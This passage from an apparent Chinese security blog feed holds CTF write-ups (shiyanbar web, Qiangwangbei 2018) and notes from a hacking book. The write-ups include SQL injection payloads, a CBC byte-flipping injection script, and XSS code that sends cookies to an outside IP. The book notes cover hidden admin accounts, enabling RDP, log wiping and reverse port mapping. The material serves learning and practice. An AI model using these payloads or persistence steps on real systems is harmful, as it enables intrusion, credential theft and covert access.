password=&#39;1&#39;=&#39;&#39;</code></pre><p>username=’1’=’’这句，先有username=’1’返回0，然后再和’’比较，mysql中的弱类型比较0和空字符串是相等的，所以能返回1，后面半句同理，所以整句能够返回1，flag为ctf{51d1bf8fb65a8c2406513ee8f52283e7}。<br><img src="http://oy0tigw51.bkt.clouddn.com/201804011614_554.png" alt=""></p><h3 id="你真的会PHP吗？"><a href="#你真的会PHP吗？" class="headerlink" title="*你真的会PHP吗？"></a>*你真的会PHP吗？</h3><p>首先fiddler抓包，在response header中发现hint:6c525af4059b4fe7d8c33a.txt,打开后找到index.php源码<br><img src="http://oy0tigw51.bkt.clouddn.com/201803201958_595.png" alt=""></p><pre><code>&lt;?php$info = &quot;&quot;; $req = [];$flag=&quot;xxxxxxxxxx&quot;;ini_set(&quot;display_error&quot;, false); error_reporting(0); if(!isset($_POST[&#39;number&#39;])){   header(&quot;hint:6c525af4059b4fe7d8c33a.txt&quot;);   die(&quot;have a fun!!&quot;); }foreach([$_POST] as $global_var) {     foreach($global_var as $key =&gt; $value) {         $value = trim($value);         is_string($value) &amp;&amp; $req[$key] = addslashes($value);     } } function is_palindrome_number($number) {     $number = strval($number);     $i = 0;     $j = strlen($number) - 1;     while($i &lt; $j) {         if($number[$i] !== $number[$j]) {             return false;         }         $i++;         $j--;     }     return true; } if(is_numeric($_REQUEST[&#39;number&#39;])){   $info=&quot;sorry, you cann&#39;t input a number!&quot;;}elseif($req[&#39;number&#39;]!=strval(intval($req[&#39;number&#39;]))){     $info = &quot;number must be equal to it&#39;s integer!! &quot;;  }else{     $value1 = intval($req[&quot;number&quot;]);     $value2 = intval(strrev($req[&quot;number&quot;]));       if($value1!=$value2){          $info=&quot;no, this is not a palindrome number!&quot;;     }else{          if(is_palindrome_number($req[&quot;number&quot;])){              $info = &quot;nice! {$value1} is a palindrome number!&quot;;           }else{             $info=$flag;          }     }}echo $info;</code></pre><p>经过审计我们可以发现如果我们要拿到flag，POST的number需要满足以下条件：<br>1.不为空，且不能是一个数值型数字，包括小数。(由is_numeric函数判断)<br>2.不能是一个回文数。（is_palindrome_number判断）<br>3.该数的反转的整数值应该和它本身的整数值相等。即：</p><p>intval($req[“number”])=intval(strrev($req[“number”]))<br>1<br>回文数就是类似于121这样的数。从上面可以看出2，3条件似乎是冲突滴！</p><p>下面给出两种解法：</p><p>1.利用intval函数溢出绕过<br>Intval函数获取变量整数值。<br>函数介绍清点这里<br>Intval最大的值取决于操作系统。 32 位系统最大带符号的 integer 范围是 -2147483648 到 2147483647。举例，在这样的系统上， intval(‘1000000000000’) 会返回 2147483647。64 位系统上，最大带符号的 integer 值是 9223372036854775807。</p><p>通过上面我们知道服务器的操作系统是32位的，所以我们构造2147483647就可以同时满足2，3条件。通过把空字符可以绕过is_numeric的判断（如%00,%20）,所以我们构造以下poc，number=2147483647%00 和number=2147483647%20都可。</p><p>对于第一个条件，我们需要构造是让我们的poc被函数判断为非数值，但又不影响它值的构造，理所当然想到空格字符和空字符。</p><p>而经过测试我发现is_numeric函数对于空字符%00，无论是%00放在前后都可以判断为非数值，而%20空格字符只能放在数值后。所以，查看函数发现该函数对对于第一个空格字符会跳过空格字符判断，接着后面的判断！！<br><img src="http://oy0tigw51.bkt.clouddn.com/201803202002_274.png" alt=""></p><h3 id="后台登录"><a href="#后台登录" class="headerlink" title="后台登录"></a>后台登录</h3><p>首先代码审查</p><p>在查看页面源码中发现 代码泄露</p><pre><code>&lt;!-- $password=$_POST[&#39;password&#39;];    $sql = &quot;SELECT * FROM admin WHERE username = &#39;admin&#39; and password = &#39;&quot;.md5($password,true).&quot;&#39;&quot;;    $result=mysqli_query($link,$sql);        if(mysqli_num_rows($result)&gt;0){            echo &#39;flag is :&#39;.$flag;        }        else{            echo &#39;密码错误!&#39;;        } --&gt;</code></pre><p>后台对传入的 password进行MD5加密后进行数据库 </p><p>想着怎么去构造一个MD5加密后的结果 在百度上搜了下<br>找到一个字符串  ffifdyop md5后，276f722736c95d99e921722cf9ed621c<br>再转成字符串：<code>&#39;or&#39;6&lt;trash&gt;</code><br>那整个sql变成</p><pre><code>SELECT * FROM admin WHEREusername = &#39;admin&#39; and password = &#39;&#39;or&#39;6&lt;trash&gt;&#39;</code></pre><p><img src="http://oy0tigw51.bkt.clouddn.com/201804011637_720.png" alt=""></p><h3 id="简单的登录题"><a href="#简单的登录题" class="headerlink" title="简单的登录题"></a>简单的登录题</h3><p>这题名字叫简单的登录题，实际上一点都不算简单，要认真写一个writeup确实很费劲，但pcat还是写了一篇过得去的。</p><p>1.做题的初步收集、整理<br>index.php是一个普通的登录框，输入id来登录，我们用burpsuite抓下包，并使用Repeater功能。<br>1) 当post id时候，返回包Set-cookie里包含iv和cipher，这2个英文单词玩密码学就很容易理解，iv就是Initialization Vector(初始化向量)，cipher就是密文</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201804011324_762.png" alt=""><br>注意这里有个提示：test.php<br>登录得到<br><img src="http://oy0tigw51.bkt.clouddn.com/201804011334_838.png" alt=""><br>查看源码得到<br><img src="http://oy0tigw51.bkt.clouddn.com/201804011335_302.png" alt=""><br>源码过滤|-|#|=|~|union|like|procedure这些语句</p><p>2) 使用Repeater功能不断的发送相同的包，返回的iv和cipher都不一样，基本断定每次的iv值是随机生成，另外iv和cipher的格式都是先base64编码后再进行urlencode编码。这里逻辑几句，不少人总看到base64解码后的字符是乱码后，就问该怎么解密之类的话，其实不要搞混了，base64不是一种加密方式，只是一种编码方式，base64编码后可以让不可视字符可视化（这才是最大的作用），而不起任何加密作用。<br>3) 把iv值经过urldecode再base64解码后用len()得到长度为16，基本猜测算法是aes，而且大胆猜测是aes的cbc模式<br>4) 从id=1入手，发现有#和-都会被waf检测到<br>5) 当cookies里有iv值和cipher值，然后不提交任何参数（包括id），就会显示Hello，猜测是根据传入的iv和cipher来解码后，再参与内部的sql查询出用户名<br>6) 由于aes的key值不知道，我就觉得这题比较难做了，然后先按照web题的基本思路———扫描，打开御剑扫一下，幸运的发现test.php泄露了源码。整理下源码中的逻辑：<br> <em>1 若是post id，就先进行waf检测，检测过了才随机生成iv值，并且对array(‘id’=&gt;$id)进行php的序列化操作，再进行aes加密，再分别对iv和cipher进行base64编码并设置到cookies </em>2 如果cookies里有iv和cipher，就对其base64解码，然后对其aes解密，再进行php反序列化，如果不能反序列化则返回解密后的明文的base64编码，如果可以则进行sql语句拼接，查询若是行数&gt;0就显示其username列的值，否则都是Hello!<br> <em>3 难点1，过滤了#-=,还有union和procedure </em>4 难点2，注入点在limit后面，而且后面还是”,0”，0本来就是让limit取出0行，而前面的逗号更是难弄掉<br> *5 aes的加密模式aes-128-cbc<br>7) mysql语法，limit后面只能procedure还有for update，还有尝试了堆叠注入，也是不行。<br>8) 本题算比较好点，mysql会显示错误信息，这就可以弄报错注入（当前是得有前提的）</p><p>2.构建能绕过过滤的payload<br>尝试了很多，发现post id=1;%00（这里关键是;%00）可以绕过去，然后登录后会显示Hello!rootzz，说明user表里的值是rootzz，而并不是我们所期待的flag值（如果那么简单就好了- -）<br>关键的关键字都被过滤，这可怎么办？<br>这时候要冷静分析下。<br>1) 直接post id时候是有过滤<br>2) 在cookies解密出来是没有过滤，就直接拼接sql语句<br>于是我们可以大胆猜测，修改cookies的值来达到解密后的明文可以构造sql注入。</p><p>这并不是无的放矢，在密码学里是可以做到的</p><p>3.aes的cbc byte flipping attack（cbc字节翻转攻击）<br>先放出参考文章，自己可以多去阅读<br>推荐英文文章：<br><a href="http://resources.infosecinstitute.com/cbc-byte-flipping-attack-101-approach/" target="_blank" rel="external">http://resources.infosecinstitute.com/cbc-byte-flipping-attack-101-approach/</a><br>以下是中文译文（其中图片挂了，结合英文版就没问题）：</p><pre><code>http://wps2015.org/drops/drops/CBC%E5%AD%97%E8%8A%82%E7%BF%BB%E8%BD%AC%E6%94%BB%E5%87%BB-101Approach.html=======</code></pre><p>cbc字节翻转攻击，我就不叙述原理，我直接演示一个简单的操作：<br>把id=12的密文修改后解析为id=1#</p><p>这里因为序列化是php的，我先写了一个php文件，便于显示</p><pre><code>&lt;?php$id=@$_POST[&#39;id&#39;];$info = array(&#39;id&#39;=&gt;$id);$plain = serialize($info);$row=ceil(strlen($plain)/16);for($i=0;$i&lt;$row;$i++){    echo substr($plain,$i*16,16).&#39;&lt;br/&gt;&#39;;}</code></pre><p>当post id=12时候，显示<br>a:1:{s:2:”id”;s:<br>2:”12”;}<br>每一行16个字节，这里12的2对应上一行{的偏离量是4<br>有这个准备后，<br>在原题里post id=12，得到下面（这只是示例）<br>iv=ZoP2z9EI7VWaWz%2F1GfYB6Q%3D%3D<br>cipher=U9qq54FOYcS2MFFB7UJFjVcSWpi0zsc%2BnVAnMkjkcRY%3D</p><p>运行以下脚本</p><pre><code># -*- coding:utf8 -*-__author__=&#39;pcat@chamd5.org&#39;from base64 import *import urllibcipher=&#39;U9qq54FOYcS2MFFB7UJFjVcSWpi0zsc%2BnVAnMkjkcRY%3D&#39;cipher_raw=b64decode(urllib.unquote(cipher))lst=list(cipher_raw)idx=4c1=&#39;2&#39;c2=&#39;#&#39;lst[idx]=chr(ord(lst[idx])^ord(c1)^ord(c2))cipher_new=&#39;&#39;.join(lst)cipher_new=urllib.quote(b64encode(cipher_new))print cipher_new</code></pre><p>得到cipher_new<br>U9qq55BOYcS2MFFB7UJFjVcSWpi0zsc%2BnVAnMkjkcRY%3D<br>再用之前的iv一起去访问，得到<br>base64_decode(‘g8COFrN/0Z3FDCOZ6MfV5zI6IjEjIjt9’) can’t unserialize<br>这是因为iv值没修改，导致无法反序列化</p><p>运行以下脚本</p><pre><code># -*- coding:utf8 -*-__author__=&#39;pcat@chamd5.org&#39;from base64 import *import urllibiv=&#39;ZoP2z9EI7VWaWz%2F1GfYB6Q%3D%3D&#39;iv_raw=b64decode(urllib.unquote(iv))first=&#39;a:1:{s:2:&quot;id&quot;;s:&#39;plain=b64decode(&#39;g8COFrN/0Z3FDCOZ6MfV5zI6IjEjIjt9&#39;)iv_new=&#39;&#39;for i in range(16):    iv_new+=chr(ord(plain[i])^ord(first[i])^ord(iv_raw[i]))iv_new=urllib.quote(b64encode(iv_new))print iv_new</code></pre><p>得到iv_new<br>hHlJ4xkEBvpldXUI0wqnNA%3D%3D<br>再跟之前的cipher_new，一起去访问，得到<br>Hello!rootzz<br>也就是id=12顺利变成了id=1#注入成功。</p><p>离成功就差一步了，<br>1) 把上面的过程编写成脚本<br>2) 尽可能只翻转一个字节，例如把2nion翻转为union，末尾再用;%00来注释掉后面<br>3) 由于逗号被过滤，用join来代替；等号被过滤，用regexp来代替</p><p>以下是pcat的脚本：</p><pre><code># -*- coding:utf8 -*-# 请保留我的个人信息，谢谢~！__author__=&#39;pcat@chamd5.org&#39;from base64 import *import urllibimport requestsimport redef mydecode(value):    return b64decode(urllib.unquote(value))def myencode(value):    return urllib.quote(b64encode(value))def mycbc(value,idx,c1,c2):    lst=list(value)    lst[idx]=chr(ord(lst[idx])^ord(c1)^ord(c2))    return &#39;&#39;.join(lst)def pcat(payload,idx,c1,c2):    url=r&#39;http://ctf5.shiyanbar.com/web/jiandan/index.php&#39;    myd={&#39;id&#39;:payload}    res=requests.post(url,data=myd)    cookies=res.headers[&#39;Set-Cookie&#39;]    iv=re.findall(r&#39;iv=(.*?),&#39;,cookies)[0]    cipher=re.findall(r&#39;cipher=(.*)&#39;,cookies)[0]    iv_raw=mydecode(iv)    cipher_raw=mydecode(cipher)    cipher_new=myencode(mycbc(cipher_raw,idx,c1,c2))    cookies_new={&#39;iv&#39;:iv,&#39;cipher&#39;:cipher_new}    cont=requests.get(url,cookies=cookies_new).content    plain=b64decode(re.findall(r&quot;base64_decode\(&#39;(.*?)&#39;\)&quot;,cont)[0])    first=&#39;a:1:{s:2:&quot;id&quot;;s:&#39;    iv_new=&#39;&#39;    for i in range(16):        iv_new+=chr(ord(first[i])^ord(plain[i])^ord(iv_raw[i]))    iv_new=myencode(iv_new)    cookies_new={&#39;iv&#39;:iv_new,&#39;cipher&#39;:cipher_new}    cont=requests.get(url,cookies=cookies_new).content    print &#39;Payload:%s\n&gt;&gt; &#39; %(payload)    print cont    passdef foo():    pcat(&#39;12&#39;,4,&#39;2&#39;,&#39;#&#39;)    pcat(&#39;0 2nion select * from((select 1)a join (select 2)b join (select 3)c);&#39;+chr(0),6,&#39;2&#39;,&#39;u&#39;)    pcat(&#39;0 2nion select * from((select 1)a join (select group_concat(table_name) from information_schema.tables where table_schema regexp database())b join (select 3)c);&#39;+chr(0),7,&#39;2&#39;,&#39;u&#39;)    pcat(&quot;0 2nion select * from((select 1)a join (select group_concat(column_name) from information_schema.columns where table_name regexp &#39;you_want&#39;)b join (select 3)c);&quot;+chr(0),7,&#39;2&#39;,&#39;u&#39;)    pcat(&quot;0 2nion select * from((select 1)a join (select value from you_want limit 1)b join (select 3)c);&quot;+chr(0),6,&#39;2&#39;,&#39;u&#39;)    passif __name__ == &#39;__main__&#39;:    foo()    print &#39;ok&#39;</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;实验吧web—writeup&quot;&gt;&lt;a href=&quot;#实验吧web—writeup&quot; class=&quot;headerlink&quot; title=&quot;实验吧web—writeup&quot;&gt;&lt;/a&gt;实验吧web—writeup&lt;/h1&gt;&lt;p&gt;[toc]&lt;/p&gt;
&lt;h3 id=&quot;Form
      
    
    </summary>
    
      <category term="CTF" scheme="http://0xmj.club/categories/CTF/"/>
    
    
      <category term="WP" scheme="http://0xmj.club/tags/WP/"/>
    
  </entry>
  
  <entry>
    <title>第二届强网杯-部分wp</title>
    <link href="http://0xmj.club/2018/04/02/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%9D%AF-%E9%83%A8%E5%88%86wp/"/>
    <id>http://0xmj.club/2018/04/02/第二届强网杯-部分wp/</id>
    <published>2018-04-02T08:08:51.000Z</published>
    <updated>2018-04-02T08:09:14.519Z</updated>
    
    <content type="html"><![CDATA[<p>#第二届强网杯-部分wp</p><h2 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h2><p>flag{welcome_to_qwb}</p><h2 id="web签到"><a href="#web签到" class="headerlink" title="web签到"></a>web签到</h2><blockquote><p>=== 在进行比较的时候，会先判断两种字符串的类型是否相等，再比较<br>== 在进行比较的时候，会先将字符串类型转化成相同，再比较</p></blockquote><p>第一关<br><img src="http://oy0tigw51.bkt.clouddn.com/201803252209_432.png" alt=""><br>这个就是标准的弱类型了<br>取md5之后为0e开头的字符串，如<br>param1=240610708<br>param2=s878926199a<br>第二关<br><img src="http://oy0tigw51.bkt.clouddn.com/201803252216_349.jpg" alt=""><br>考察php的弱类型和数组绕过基础，都是恨经典的题<br>这道题不能用弱类型绕过，但是可以用数组导致md5()函数报错返回空，空===空符合条件，得到Flag。<br>param1[]=1&amp;param2[]=2<br>第三关<br>这道题可以用hash碰撞解决，字符串：</p><pre><code>param1=%D11%DD%02%C5%E6%EE%C4i%3D%9A%06%98%AF%F9%5C%2F%CA%B5%87%12F%7E%AB%40%04X%3E%B8%FB%7F%89U%AD4%06%09%F4%B3%02%83%E4%88%83%25qAZ%08Q%25%E8%F7%CD%C9%9F%D9%1D%BD%F2%807%3C%5B%D8%82%3E1V4%8F%5B%AEm%AC%D46%C9%19%C6%DDS%E2%B4%87%DA%03%FD%029c%06%D2H%CD%A0%E9%9F3B%0FW%7E%E8%CET%B6p%80%A8%0D%1E%C6%98%21%BC%B6%A8%83%93%96%F9e%2Bo%F7%2Apparam2=%D11%DD%02%C5%E6%EE%C4i%3D%9A%06%98%AF%F9%5C%2F%CA%B5%07%12F%7E%AB%40%04X%3E%B8%FB%7F%89U%AD4%06%09%F4%B3%02%83%E4%88%83%25%F1AZ%08Q%25%E8%F7%CD%C9%9F%D9%1D%BDr%807%3C%5B%D8%82%3E1V4%8F%5B%AEm%AC%D46%C9%19%C6%DDS%E24%87%DA%03%FD%029c%06%D2H%CD%A0%E9%9F3B%0FW%7E%E8%CET%B6p%80%28%0D%1E%C6%98%21%BC%B6%A8%83%93%96%F9e%ABo%F7%2Ap</code></pre><p><img src="http://oy0tigw51.bkt.clouddn.com/201803252223_324.png" alt=""></p><blockquote><p>另外还有一种方式可以把三关过掉就是使用md5碰撞</p></blockquote><pre><code>param1=o%BC%FA%5C%0EiG%CA%1C%D7%DB%B4%E0%9B%FCF%A78%0Aj%18%B5%C3Q%0C%9A%82%CE%27%A4Cf%40%B1%FC%D6%DC%8D%DF%05%EB%B9%DF%5B%18%88%D4%A6%05%956%BC%EC-%3E%90%0F%26%FA%2C%AA%21%25%20g%A7%DB%EA%DB%89%05%A7%07%0D%14dS%20S%FB%90%B5%8A%C4T%E5%B2L%20%95%1C6%CD%17N%CE-%80%7B%9C%1E%8DN%26%1A%3A%11%BA%9E%B4%11%BD%04%99%0F%E1%9D%C4%D3%E2%D8%9E%B8%E6%7F%B3%E9%06&amp;param2=o%BC%FA%5C%0EiG%CA%1C%D7%DB%B4%E0%9B%FCF%A78%0A%EA%18%B5%C3Q%0C%9A%82%CE%27%A4Cf</code></pre><p>##welcome<br>改名.jpg<br><img src="http://oy0tigw51.bkt.clouddn.com/201803260100_207.png" alt=""><br>放入stegsolve<br>stereogram slover移位操作<br><img src="http://oy0tigw51.bkt.clouddn.com/201803260104_53.png" alt=""><br>offset 80</p><h2 id="share-you-mind"><a href="#share-you-mind" class="headerlink" title="share you mind"></a>share you mind</h2><p><img src="http://oy0tigw51.bkt.clouddn.com/201803261418_523.png" alt=""><br>发现js有rpo漏洞，其中内容可由编写的文章成为js。<br>参考文章：blog.nsfocus.net/rpo-attack/<br><a href="https://lorexxar.cn/2017/05/12/xss-bot2/" target="_blank" rel="external">https://lorexxar.cn/2017/05/12/xss-bot2/</a></p><p><a href="http://39.107.33.96:20000/index.php/view/article/4643/%2f..%2f..%2f..%2f..%2f" target="_blank" rel="external">http://39.107.33.96:20000/index.php/view/article/4643/%2f..%2f..%2f..%2f..%2f</a></p><p>提示是Try to get the cookie of path “/QWB_fl4g/QWB/”获取目录下的cookie<br>所以先获取了一下cookie，发现没有flag</p><pre><code>b=document.cookie;a=&quot;&lt;img src=//115.29.36.83:23338/&quot;+btoa(b)+&quot;&gt;&quot;;document.write(a);</code></pre><p>但是有提示是Try to get the cookie of path “/QWB_fl4g/QWB/“</p><p>那就是获取目录下的cookie</p><pre><code>var i = document.createElement(&quot;iframe&quot;);i.setAttribute(&quot;src&quot;, &quot;/QWB_fl4g/QWB/&quot;);document.body.appendChild(i);i.addEventListener( &quot;load&quot;, function(){  var content = i.contentWindow.document.cookie;  location=&#39;//115.29.36.83:23338/&#39;+btoa(content);}, false);</code></pre><p>再利用eval包含住String.fromCharCode即可，payload长度还有些限制。</p><p>QWB{flag_is_f43kth4rpo}</p><h2 id="streamgame1"><a href="#streamgame1" class="headerlink" title="streamgame1"></a>streamgame1</h2><p>下载得到一个文件 末尾添加.zip<br>解压得到两个文件一个key 一个加密的py文件<br>所以查看py文件得到key加密算法<br>发现可以爆破<br>所以写如下脚本</p><pre><code>python# coding=utf-8  def lfsr(R, mask):      output = (R &lt;&lt; 1) &amp; 0xffffff    i = (R &amp; mask) &amp; 0xffffff    lastbit = 0     while i != 0:          lastbit ^= (i &amp; 1)          i = i &gt;&gt; 1    output ^= lastbit      return (output, lastbit)  def main1(flag):      R = flag     mask = 0b1010011000100011100    f = open(&quot;key1&quot;, &quot;wb&quot;)      for i in range(12):    tmp = 0     for j in range(8):              (R, out) = lfsr(R, mask)              tmp = (tmp &lt;&lt; 1) ^ out          f.write(chr(tmp))      f.close()  key = open(&#39;key&#39;, &#39;rb&#39;)  key1 = key.read()  for x in range(524288, -1, -1):      main1(x)      key2 = open(&#39;key1&#39;, &#39;rb&#39;)      result = key2.read()      if (result == key1):          print x          break     key2.close()</code></pre><p>爆破得到<br>481387<br><code>flag{1110101100001101011}</code></p><h2 id="streamgame2"><a href="#streamgame2" class="headerlink" title="streamgame2"></a>streamgame2</h2><p>下载得到一个文件 末尾添加.zip<br>解压得到两个文件一个key 一个加密的py文件<br>所以查看py文件得到key加密算法<br>与上一道题相似脚本如下</p><pre><code>python# coding=utf-8  def lfsr(R, mask):      output = (R &lt;&lt; 1) &amp; 0xffffff     i = (R &amp; mask) &amp; 0xffffff     lastbit = 0     while i != 0:          lastbit ^= (i &amp; 1)          i = i &gt;&gt; 1     output ^= lastbit      return (output, lastbit)  def main1(flag):      R = flag      mask = 0x100002     f = open(&quot;key1&quot;, &quot;wb&quot;)      for i in range(12):          tmp = 0     for j in range(8):              (R, out) = lfsr(R, mask)              tmp = (tmp &lt;&lt; 1) ^ out          f.write(chr(tmp))      f.close()  key = open(&#39;key&#39;, &#39;rb&#39;)  key1 = key.read()  for x in range(0b111111111111111111111 \+ 1, -1, -1):      main1(x)      key2 = open(&#39;key1&#39;, &#39;rb&#39;)      result = key2.read()      if (result == key1):          print x          break     key2.close()</code></pre><p>flag{110111100101001101001}</p><h2 id="Three-hit-Web"><a href="#Three-hit-Web" class="headerlink" title="Three hit    Web"></a>Three hit    Web</h2><p>注册将用户名，密码，年龄写入数据库，登录过后将年龄显示出来<br>思路：每次注册一个用户，注入点放进age，登录查看</p><p>注册提交age显示只能为数字，age用16进制提交，16进制提交不会对%23url解码，所以用–代替</p><p>payload:</p><pre><code>username=Str3am1&amp;age=0x2d3636363636363636363636363636363636363636363636363620756e696f6e2073656c65637420312c322c332c34206c696d697420312c312d2d&amp;password=1</code></pre><p><img src="http://oxskavewj.bkt.clouddn.com/j0mydok06kpm0m5gailch3p9l7.png" alt=""></p><p>因为每次都会将年龄写入数据库里面，所以每次都需要修改年龄的值</p><pre><code>username=Str3am11&amp;age=0x2d36363636363636363636363636363636363636363636363620756e696f6e2073656c65637420312c2873656c65637420666c61672066726f6d20666c6167292c332c34206c696d697420312c312d2d&amp;password=1</code></pre><p><img src="http://oxskavewj.bkt.clouddn.com/72x5eade9sy8pewomdvy5w0yq4.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;#第二届强网杯-部分wp&lt;/p&gt;
&lt;h2 id=&quot;签到&quot;&gt;&lt;a href=&quot;#签到&quot; class=&quot;headerlink&quot; title=&quot;签到&quot;&gt;&lt;/a&gt;签到&lt;/h2&gt;&lt;p&gt;flag{welcome_to_qwb}&lt;/p&gt;
&lt;h2 id=&quot;web签到&quot;&gt;&lt;a href=&quot;#
      
    
    </summary>
    
      <category term="CTF" scheme="http://0xmj.club/categories/CTF/"/>
    
    
      <category term="WP" scheme="http://0xmj.club/tags/WP/"/>
    
  </entry>
  
  <entry>
    <title>黑客攻防web安全实战详解</title>
    <link href="http://0xmj.club/2018/02/27/%E9%BB%91%E5%AE%A2%E6%94%BB%E9%98%B2web%E5%AE%89%E5%85%A8%E5%AE%9E%E6%88%98%E8%AF%A6%E8%A7%A3/"/>
    <id>http://0xmj.club/2018/02/27/黑客攻防web安全实战详解/</id>
    <published>2018-02-27T11:57:12.000Z</published>
    <updated>2018-02-27T11:57:48.378Z</updated>
    
    <content type="html"><![CDATA[<h1 id="黑客攻防web安全实战详解"><a href="#黑客攻防web安全实战详解" class="headerlink" title="黑客攻防web安全实战详解"></a>黑客攻防web安全实战详解</h1><p><img src="http://oy0tigw51.bkt.clouddn.com/201801051020_332.png" alt=""></p><h2 id="第一章：网络基础"><a href="#第一章：网络基础" class="headerlink" title="第一章：网络基础"></a>第一章：网络基础</h2><p>###计算机网络<br>IP协议和TCP/IP模型<br>ip地址一般为点分十进制，4段，例如192.168.1.1<br>cmd——&gt;ipconfig 查询本机ip地址</p><p>###端口<br>范围在0-65535<br>21端口：FTP服务<br>23端口：Telnet（远程登录）服务<br>25：SMTP发送邮件<br>80：HTTP<br>109、110：POP2，POP3.<br>135：RPC<br>137：NetBIOS<br>3389：远程桌面服务端口<br>5632：远程软件<br>8080：同80用于WWW代理服务</p><p>cmd——&gt;netstat -on可查看本机开放的端口</p><p>Web服务3种协议<br>HTTP-GET 和    HTTP-POST SOAP(XML web service最常用到的) </p><h2 id="第二章：信息搜索与社会工程"><a href="#第二章：信息搜索与社会工程" class="headerlink" title="第二章：信息搜索与社会工程"></a>第二章：信息搜索与社会工程</h2><p>whois查询域名的ip和所有者信息的传输协议<br>SEO综合查询  <a href="http://tool.chinaz.com/" target="_blank" rel="external">站长工具</a></p><h3 id="常见的端口扫描技术："><a href="#常见的端口扫描技术：" class="headerlink" title="常见的端口扫描技术："></a>常见的端口扫描技术：</h3><p>TCP connect()扫描<br>TCP SYN 扫描<br>TCP FIN扫描<br>实战端口扫描</p><ol><li><a href="http://tool.chinaz.com/port" target="_blank" rel="external">站长工具</a></li><li>scanport</li></ol><h3 id="web目录扫描"><a href="#web目录扫描" class="headerlink" title="web目录扫描"></a>web目录扫描</h3><p>1.wwwscan<br>2.御剑<br>3.safe3wvs</p><h3 id="web漏洞扫描"><a href="#web漏洞扫描" class="headerlink" title="web漏洞扫描"></a>web漏洞扫描</h3><p>1.APPscan<br>2.x-scan<br>3.nessus<br>4.在线扫描工具scanv<br>5.jsky<br>6.Awvs<br>7.webcruiser</p><h3 id="Googlehack"><a href="#Googlehack" class="headerlink" title="Googlehack"></a>Googlehack</h3><p>www.google.com/intl/xx-hacker 黑客专用入口<br>www.google.com/custom?hl=zh-CN 中文黑客专用信息和资料搜索地址<br>www.google.com/custom?hl=en 英文黑客专用信息和资料搜索地址</p><p>intext或allintext 搜索网站正文<br>intitle或allintitle 搜索网站标题<br>cache搜索缓存内容<br>define 查找关键字的定义<br>filetype：文件名.后缀名   例如：信息安全论文 filetype:doc<br>info搜索网站基本信息<br>inurl或allinurl</p><blockquote><p>inurl: admin/login.asp site:www.sina.con<br>就会搜索这个网站下的包含 admin/login.sap的链接<br>inurl:php?id=    搜索包含:php?id=的链接</p></blockquote><p>intitle 网站标题中包含了查询关键词的网页</p><blockquote><p>[攻防 intitle：实战]</p></blockquote><p>site 指定搜索一个站<br>intext 网站正文</p><blockquote><p>site:xx.com intext:管理<br> site:xx.com intext:manage<br>  site:xx.com intext:admin<br>  site:xx.com intitle:后台<br>   site:xx.com inurl:admin</p></blockquote><p>搜索网站目录<br>index<br>转到父目录<br>to parent directory</p><h4 id="社会工程学"><a href="#社会工程学" class="headerlink" title="社会工程学"></a>社会工程学</h4><p>一切利用人自身漏洞的行为都属于社会工程学范畴</p><h3 id="入侵"><a href="#入侵" class="headerlink" title="入侵"></a>入侵</h3><p>net user test1 123 /add<br>其中test1 为用户名 123为密码</p><p>开启3389端口<br>“REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal””Server /v fDenyTSConnections /t REG_DWORD /d 0 /f”<br>提升用户权限：”net localgroup administrators test1 /add”<br>分别执行这两条命令，或者使用开启3389服务工具</p><h4 id="留后门"><a href="#留后门" class="headerlink" title="留后门"></a>留后门</h4><p>方法一：安装远控程序<br>方法二：建立隐蔽的用户，并将远程连接端口3389改为其他端口。<br>在建立用户帐户时，如果在用户名后面加上$符号，就可以建立一个简单的隐藏帐户，如“test$”。<br>在字符界面下执行net user命令，就无法查看到这个帐户，但是在图形界面的“本地用户和组”中仍然可以看到。在入侵了一台主机之后，一般都要想办法给自己留一个后门，而给自己加一个管理员组的帐户则是常用的手法。由于带“$”的帐户容易被发现，于是一些人就在帐户的显示名称上下功夫，建立一个看起来和系统帐户类似的名字来迷惑管理员，如admin、sysadmin、Billgates、root等。</p><pre><code>net user chun$ password /add net localgroup administrators chun$ /add 这样我们就利用“命令提示符”成功得建立了一个用户名为“chun$”，密码为“password”的简单“隐藏账户”，并且把该隐藏账户提升为了管理员权限</code></pre><p>方法三：<br>开始 –&gt; 运行 –&gt; regedit –&gt; 确定<br>依次展开<br>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\Wds\rdpwd\Tds\tcp<br>分支，其下的”PortNumber”键值所对应的就是端口号，将其修改即可。上面设置完成后，需要再依次展开<br>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp<br>分支，同样将其下的”PortNumber”键值进行更改。<br>比如可以将端口改为13389</p><h4 id="清脚印"><a href="#清脚印" class="headerlink" title="清脚印"></a>清脚印</h4><p>推荐日志清除工具， aio.exe</p><h4 id="跨站脚本利用"><a href="#跨站脚本利用" class="headerlink" title="跨站脚本利用"></a>跨站脚本利用</h4><p>1.死循环</p><pre><code>&lt;script&gt;while(true)alert(&#39;炸死你！&#39;)&lt;/script&gt;</code></pre><p>2.隐藏访问</p><pre><code>&lt;script&gt;window.location.href=&quot;目标网站&quot;&lt;/script&gt;</code></pre><p>3.更加隐蔽访问</p><pre><code>&lt;iframe src=&quot;目标网站&quot; width=&quot;0&quot; height=&quot;0&quot;&gt; &lt;/iframe&gt;</code></pre><p>4.获取cookie</p><pre><code>&lt;script&gt;alert(document.cookie);&lt;/script&gt;</code></pre><h3 id="web权限提升"><a href="#web权限提升" class="headerlink" title="web权限提升"></a>web权限提升</h3><p>mstsc进行远程桌面连接</p><p>内网：<br>1.反相连接<br>让远程服务器自己来向本地计算机请求，从而解决无法主动向内部服务器发送数据的问题。<br>lcx.exe是一款著名的反向连接的内网端口映射工具。<br>本机：lcx-listen 51 3389<br>这条命令的作用是将本地的51端口与3389端口开启监听状态，并且使两端互相开启映射<br>服务器：lcx.exe-slave 192.168.49.151 192.168.129 3389<br>这样3389端口服务器就会向51端口服务器请求连接，并且将从51端口获取的数据传给3389端口。</p><h3 id="基于内网的入侵"><a href="#基于内网的入侵" class="headerlink" title="基于内网的入侵"></a>基于内网的入侵</h3><p>局域网(Local Area 